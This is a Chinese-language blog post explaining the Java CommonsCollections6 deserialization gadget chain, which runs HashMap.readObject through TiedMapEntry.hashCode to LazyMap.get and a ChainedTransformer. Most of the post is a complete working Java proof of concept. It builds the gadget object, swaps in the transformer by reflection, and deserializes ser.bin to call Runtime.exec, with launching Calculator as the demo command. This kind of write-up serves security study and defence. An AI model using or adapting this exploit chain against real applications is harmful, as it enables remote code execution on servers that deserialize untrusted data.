---  
title: CommonsCollections6链详解  
subtitle:  
date: 2024-01-15T15:29:23+08:00  
slug: 70fa896  
draft: false  
author:  
  name: N1Rvana  
  email: beichenghua@gmail.com  
  avatar: avatar.png  
description:  
keywords:  
license:  
comment: false  
weight: 0  
tags:  
  - CommonsCollections  
categories:  
  - Java  
hiddenFromHomePage: false  
hiddenFromSearch: false  
hiddenFromRss: false  
hiddenFromRelated: false  
summary:  
resources:  
  - name: featured-image  
    src: featured-image.jpg  
  - name: featured-image-preview  
    src: featured-image-preview.jpg  
toc: true  
math: false  
lightgallery: false  
password:  
message:  
repost:  
  enable: true  
  url:  
  
# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter  
---  
  
世界上最好用的 CC 链  
<!--more-->  
## CommonsCollections6 详解  
CommonsCollections1 的链子调用了`LazyMap`类中的`transform()`方法，于是找一个任意类调用`get()`方法的地方，这里换到了`TideMapEntry`类  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401151516691.png)  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401151516403.png)  
这里的`hashCode()`方法里调用了`getValue()`方法里面调用了`get()`方法，并且`map`可控，这里的`hashCode()`很熟悉，因为在`URLDNS`链中`HashMap`类里的`readObject()`方法调用到了`hashCode()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401151518932.png)  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401151518990.png)  
于是构造`poc`  
```java  
package org.example.CommonsCollections;    
    
import org.apache.commons.collections.Transformer;    
import org.apache.commons.collections.functors.ChainedTransformer;    
import org.apache.commons.collections.functors.ConstantTransformer;    
import org.apache.commons.collections.functors.InvokerTransformer;    
import org.apache.commons.collections.keyvalue.TiedMapEntry;    
import org.apache.commons.collections.map.LazyMap;    
    
import java.io.FileInputStream;    
import java.io.FileOutputStream;    
import java.io.ObjectInputStream;    
import java.io.ObjectOutputStream;    
import java.lang.reflect.Field;    
import java.util.HashMap;    
import java.util.Map;    
    
public class CommonsCollections6 {    
    public static void main(String[] args) throws Exception{    
    
    
        Transformer[] transformers = new Transformer[]{    
                new ConstantTransformer(Runtime.class),    
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),    
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),    
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"})    
        };    
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);    
    
        HashMap<Object, Object> map = new HashMap<>();    
        Map<Object, Object> lazymap = LazyMap.decorate(map, new ConstantTransformer(1));    
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, "test");    
    
        HashMap<Object, Object> map2 = new HashMap<>();    
        map2.put(tiedMapEntry,"test1");    
    
        lazymap.remove("test");    
    
        Class c = LazyMap.class;    
        Field factoryField = c.getDeclaredField("factory");    
        factoryField.setAccessible(true);    
        factoryField.set(lazymap,chainedTransformer);    
        //serialize(map2);    
        unserialize("ser.bin");    
    
    }    
    public static void serialize(Object obj) throws Exception{    
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));    
        oos.writeObject(obj);    
    }    
    
    public static Object unserialize(String filename) throws Exception{    
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));    
        Object obj = ois.readObject();    
        return obj;    
    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401151528159.png)  
  